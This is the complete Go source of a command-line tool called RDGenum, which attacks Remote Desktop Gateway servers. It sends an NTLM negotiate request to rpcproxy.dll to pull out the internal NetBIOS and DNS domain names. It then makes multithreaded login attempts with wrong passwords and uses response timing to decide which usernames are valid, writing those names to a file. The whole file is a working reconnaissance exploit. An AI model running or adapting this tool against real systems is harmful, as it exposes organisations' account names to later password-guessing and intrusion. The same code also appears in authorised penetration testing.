package main

import (
        "crypto/tls"
        "encoding/binary"
        b64 "encoding/base64"
        "flag"
        "fmt"
        "io/ioutil"
        "net"
        "net/http"
        "os"
        "sort"
        "strings"
        "sync"
        "time"
)

// ANSI Color Helpers
const (
        Reset  = "\033[0m"
        Green  = "\033[1;32m"
        Yellow = "\033[1;33m"
        Red    = "\033[1;31m"
        Blue   = "\033[1;34m"
)

// Global Debug Flag
var debugEnabled bool

func info(msg string, args ...interface{}) {
        fmt.Printf(Blue+"[*] "+Reset+msg+"\n", args...)
}

func success(msg string, args ...interface{}) {
        fmt.Printf(Green+"[+] "+Reset+msg+"\n", args...)
}

func warn(msg string, args ...interface{}) {
        fmt.Printf(Yellow+"[!] "+Reset+msg+"\n", args...)
}

func crit(msg string, args ...interface{}) {
        fmt.Printf(Red+"[-] "+Reset+msg+"\n", args...)
}

func debug(msg string, args ...interface{}) {
        if debugEnabled {
                fmt.Printf("\033[1;30m[DEBUG] "+msg+Reset+"\n", args...)
        }
}

func main() {
        target := flag.String("t", "", "Target RDG Host")
        userlist := flag.String("U", "", "File containing list of usernames")
        username := flag.String("u", "", "Single username to test")
        threads := flag.Int("threads", 5, "Concurrency (Keep low for RDG timing accuracy)")
        outfile := flag.String("o", "", "Output file for valid users")
        verbose := flag.Bool("v", false, "Show invalid attempts")
        dbg := flag.Bool("debug", false, "Show detailed error and protocol debug output")
        flag.Parse()

        debugEnabled = *dbg

        if *target == "" {
                fmt.Println("RDGenum v1.3.1 - Professional RDG User Enumerator")
                flag.Usage()
                return
        }

        tr := &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                Proxy:           http.ProxyFromEnvironment,
                DialContext: (&net.Dialer{
                        Timeout:   30 * time.Second,
                        KeepAlive: 30 * time.Second,
                }).DialContext,
        }

        // 1. Domain Extraction
        info("Targeting: %s", *target)
        nbDomain, dnsDomain, err := harvestRDGInfo(*target, tr)
        if err != nil {
                crit("Target identification failed: %v", err)
                os.Exit(1)
        }

        success("Internal NetBIOS Domain: %s", nbDomain)
        success("Internal DNS Domain:     %s", dnsDomain)

        // 2. Prep User List
        var users []string
        if *userlist != "" {
                users = importUserList(*userlist)
        } else if *username != "" {
                users = []string{*username}
        } else {
                warn("No user or userlist provided. Identification only.")
                return
        }

        if len(users) == 0 {
                crit("User list is empty or could not be read.")
                return
        }

        // 3. Timing Baseline
        baseline, err := getTimingBaseline(*target, nbDomain, tr)
        if err != nil {
                crit("Failed to establish timing baseline: %v", err)
                os.Exit(1)
        }
        threshold := baseline / 2

        // 4. Enumeration
        info("Threshold for valid accounts: < %v", threshold)
        info("Starting enumeration (Threads: %d)...", *threads)

        validUsers := performEnum(*target, nbDomain, users, threshold, *threads, *verbose, tr)

        // 5. Final Report
        fmt.Println("\n" + strings.Repeat("-", 40))
        if len(validUsers) > 0 {
                success("Enumeration Complete. Found %d valid accounts:", len(validUsers))
                for _, u := range validUsers {
                        fmt.Printf("  -> %s\n", u)
                }
                if *outfile != "" {
                        writeFile(*outfile, validUsers)
                        info("Results saved to %s", *outfile)
                }
        } else {
                warn("No valid accounts identified based on timing threshold.")
        }
        fmt.Println(strings.Repeat("-", 40))
}

func harvestRDGInfo(host string, tr *http.Transport) (string, string, error) {
        url := fmt.Sprintf("https://%s/rpc/rpcproxy.dll", host)
        client := &http.Client{Transport: tr, Timeout: 10 * time.Second}

        debug("Sending NTLM Type 1 to %s", url)
        req, err := http.NewRequest("GET", url, nil)
        if err != nil {
                return "", "", fmt.Errorf("failed to create request: %w", err)
        }

        // Type 1 Negotiate Message
        req.Header.Set("Authorization", "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==")

        resp, err := client.Do(req)
        if err != nil {
                return "", "", fmt.Errorf("network error during identification: %w", err)
        }
        defer resp.Body.Close()

        if resp.StatusCode != 401 {
                debug("Unexpected status code: %d", resp.StatusCode)
        }

        authHeader := resp.Header.Get("WWW-Authenticate")
        if authHeader == "" {
                return "", "", fmt.Errorf("no WWW-Authenticate header found")
        }

        if !strings.Contains(authHeader, "NTLM") {
                return "", "", fmt.Errorf("NTLM not supported by target (Auth: %s)", authHeader)
        }

        // Find the NTLM part
        var rawB64 string
        for _, part := range strings.Split(authHeader, ",") {
                part = strings.TrimSpace(part)
                if strings.HasPrefix(part, "NTLM ") {
                        rawB64 = strings.TrimPrefix(part, "NTLM ")
                        break
                }
        }

        if rawB64 == "" {
                return "", "", fmt.Errorf("NTLM challenge not found in auth header")
        }

        data, err := b64.StdEncoding.DecodeString(rawB64)
        if err != nil {
                return "", "", fmt.Errorf("failed to decode NTLM base64: %w", err)
        }

        if len(data) < 48 {
                return "", "", fmt.Errorf("NTLM challenge too short (%d bytes)", len(data))
        }

        nbDomain, dnsDomain := parseNTLMType2(data)
        if nbDomain == "" {
                return "", "", fmt.Errorf("failed to extract NetBIOS domain from NTLM challenge")
        }

        return nbDomain, dnsDomain, nil
}

func parseNTLMType2(data []byte) (string, string) {
        // Offset 12: Target Name (NetBIOS Domain)
        nameLen := binary.LittleEndian.Uint16(data[12:14])
        nameOff := binary.LittleEndian.Uint32(data[16:20])
        nbDomain := ""
        if int(nameOff+uint32(nameLen)) <= len(data) {
                nbDomain = strings.ReplaceAll(string(data[nameOff:nameOff+uint32(nameLen)]), "\x00", "")
        }
        debug("Parsed NetBIOS Domain: %s (Len: %d, Offset: %d)", nbDomain, nameLen, nameOff)

        // Offset 40: Target Info (AV_PAIRS)
        infoLen := binary.LittleEndian.Uint16(data[40:42])
        infoOff := binary.LittleEndian.Uint32(data[44:48])
        dnsDomain := ""
        if int(infoOff+uint32(infoLen)) <= len(data) {
                payload := data[infoOff : infoOff+uint32(infoLen)]
                for i := 0; i < len(payload)-4; {
                        id := binary.LittleEndian.Uint16(payload[i : i+2])
                        l := int(binary.LittleEndian.Uint16(payload[i+2 : i+4]))
                        i += 4
                        if id == 0x0000 { break }
                        if id == 0x0004 { // MsvAvDnsDomainName
                                dnsDomain = strings.ReplaceAll(string(payload[i:i+l]), "\x00", "")
                        }
                        i += l
                }
        }
        debug("Parsed DNS Domain: %s (Len: %d, Offset: %d)", dnsDomain, infoLen, infoOff)
        return nbDomain, dnsDomain
}

func getTimingBaseline(host, domain string, tr *http.Transport) (time.Duration, error) {
        info("Establishing timing baseline with invalid accounts...")
        fakeUsers := []string{"zero_cool_ghost_1", "acid_burn_hack_2", "lord_nibbler_3"}
        var times []float64

        for _, u := range fakeUsers {
                start := time.Now()
                status, err := doAuthRequest(host, domain, u, "NotThePassword123!", tr)
                if err != nil {
                        return 0, fmt.Errorf("error establishing baseline for %s: %w", u, err)
                }
                elapsed := time.Since(start)
                debug("Baseline attempt: %s | Status: %d | Time: %v", u, status, elapsed)
                times = append(times, float64(elapsed))
        }
        sort.Float64s(times)
        median := time.Duration(times[len(times)/2])
        info("Baseline established: %v", median)
        return median, nil
}

func performEnum(host, domain string, users []string, threshold time.Duration, threads int, verbose bool, tr *http.Transport) []string {
        var valid []string
        var mu sync.Mutex
        var wg sync.WaitGroup
        jobs := make(chan string)

        for i := 0; i < threads; i++ {
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        for user := range jobs {
                                if user == "" { continue }
                                start := time.Now()
                                status, err := doAuthRequest(host, domain, user, "WrongPassword2026!", tr)
                                elapsed := time.Since(start)

                                if err != nil {
                                        debug("Error during enum for %s: %v", user, err)
                                        continue
                                }

                                if elapsed < threshold {
                                        mu.Lock()
                                        success("MATCH: %-20s | Time: %-12v | Status: %d", user, elapsed, status)
                                        valid = append(valid, user)
                                        mu.Unlock()
                                } else if verbose {
                                        crit("FAIL:  %-20s | Time: %-12v | Status: %d", user, elapsed, status)
                                }
                        }
                }()
        }

        for _, u := range users {
                u = strings.TrimSpace(u)
                if u != "" {
                        jobs <- u
                }
        }
        close(jobs)
        wg.Wait()
        return valid
}

func doAuthRequest(host, domain, user, pass string, tr *http.Transport) (int, error) {
        url := fmt.Sprintf("https://%s/rpc/rpcproxy.dll", host)
        client := &http.Client{Transport: tr, Timeout: 20 * time.Second}
        req, err := http.NewRequest("GET", url, nil)
        if err != nil {
                return 0, err
        }

        req.SetBasicAuth(fmt.Sprintf("%s\\%s", domain, user), pass)
        req.Header.Set("User-Agent", "MSRPC")

        resp, err := client.Do(req)
        if err != nil {
                return 0, err
        }
        defer resp.Body.Close()
        return resp.StatusCode, nil
}

func importUserList(path string) []string {
        b, err := ioutil.ReadFile(path)
        if err != nil {
                crit("Could not read userlist file %s: %v", path, err)
                return []string{}
        }
        return strings.Split(strings.ReplaceAll(string(b), "\r\n", "\n"), "\n")
}

func writeFile(filename string, data []string) {
        err := ioutil.WriteFile(filename, []byte(strings.Join(data, "\n")), 0644)
        if err != nil {
                crit("Failed to write output file: %v", err)
        }
}
